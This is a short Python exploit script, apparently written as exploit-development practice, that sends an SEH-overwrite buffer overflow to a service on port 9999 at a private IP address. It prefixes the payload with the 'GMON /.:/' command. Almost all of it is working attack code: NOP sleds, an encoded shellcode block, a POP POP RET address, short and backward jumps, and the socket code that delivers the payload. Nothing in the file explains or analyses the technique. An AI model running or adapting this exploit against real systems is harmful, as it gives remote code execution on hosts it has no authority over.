import socket
import os
import sys

host = '192.168.102.148'
port = 9999

# SEH is at offset 3519
# nSEH is at offset 3515
# Found POP POP RET in nonSEH module at 0x625010B4
junk = '\x90' * (3515 - 2000 + 50)
#junk += '\xcc' * 1000

buf =  ""
buf += "\xda\xd0\xd9\x74\x24\xf4\x5b\xb8\xb0\x26\x9d\x16\x29"
buf += "\xc9\xb1\x52\x31\x43\x17\x03\x43\x17\x83\x73\x22\x7f"
buf += "\xe3\x8f\xc3\xfd\x0c\x6f\x14\x62\x84\x8a\x25\xa2\xf2"
buf += "\xdf\x16\x12\x70\x8d\x9a\xd9\xd4\x25\x28\xaf\xf0\x4a"
buf += "\x99\x1a\x27\x65\x1a\x36\x1b\xe4\x98\x45\x48\xc6\xa1"
buf += "\x85\x9d\x07\xe5\xf8\x6c\x55\xbe\x77\xc2\x49\xcb\xc2"
buf += "\xdf\xe2\x87\xc3\x67\x17\x5f\xe5\x46\x86\xeb\xbc\x48"
buf += "\x29\x3f\xb5\xc0\x31\x5c\xf0\x9b\xca\x96\x8e\x1d\x1a"
buf += "\xe7\x6f\xb1\x63\xc7\x9d\xcb\xa4\xe0\x7d\xbe\xdc\x12"
buf += "\x03\xb9\x1b\x68\xdf\x4c\xbf\xca\x94\xf7\x1b\xea\x79"
buf += "\x61\xe8\xe0\x36\xe5\xb6\xe4\xc9\x2a\xcd\x11\x41\xcd"
buf += "\x01\x90\x11\xea\x85\xf8\xc2\x93\x9c\xa4\xa5\xac\xfe"
buf += "\x06\x19\x09\x75\xaa\x4e\x20\xd4\xa3\xa3\x09\xe6\x33"
buf += "\xac\x1a\x95\x01\x73\xb1\x31\x2a\xfc\x1f\xc6\x4d\xd7"
buf += "\xd8\x58\xb0\xd8\x18\x71\x77\x8c\x48\xe9\x5e\xad\x02"
buf += "\xe9\x5f\x78\x84\xb9\xcf\xd3\x65\x69\xb0\x83\x0d\x63"
buf += "\x3f\xfb\x2e\x8c\x95\x94\xc5\x77\x7e\x5b\xb1\x11\x63"
buf += "\x33\xc0\xdd\x9a\x78\x4d\x3b\xf6\x6e\x18\x94\x6f\x16"
buf += "\x01\x6e\x11\xd7\x9f\x0b\x11\x53\x2c\xec\xdc\x94\x59"
buf += "\xfe\x89\x54\x14\x5c\x1f\x6a\x82\xc8\xc3\xf9\x49\x08"
buf += "\x8d\xe1\xc5\x5f\xda\xd4\x1f\x35\xf6\x4f\xb6\x2b\x0b"
buf += "\x09\xf1\xef\xd0\xea\xfc\xee\x95\x57\xdb\xe0\x63\x57"
buf += "\x67\x54\x3c\x0e\x31\x02\xfa\xf8\xf3\xfc\x54\x56\x5a"
buf += "\x68\x20\x94\x5d\xee\x2d\xf1\x2b\x0e\x9f\xac\x6d\x31"
buf += "\x10\x39\x7a\x4a\x4c\xd9\x85\x81\xd4\xe7\x74\x1b\xc1"
buf += "\x70\x2f\xce\xa8\x1c\xd0\x25\xee\x18\x53\xcf\x8f\xde"
buf += "\x4b\xba\x8a\x9b\xcb\x57\xe7\xb4\xb9\x57\x54\xb4\xeb"

buf += '\x90' * (1000 - len(buf))

junk += buf

junk += '\x90' * (1000 - 50)
junk += '\xEB\x06\x90\x90' 
junk += '\xb4\x10\x50\x62'

junk += '\x90' * 8

"""
nasm > jmp -2000
00000000  E92BF8FFFF        jmp 0xfffff830

"""

junk += '\xe9\x2b\xf8\xff\xff'
junk += '\xFF\xE4'

junk += 'D' * (5000 - len(junk))

sploit = 'GMON /.:/' + junk

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
expl.recv(1024)
expl.send(sploit)
expl.close()
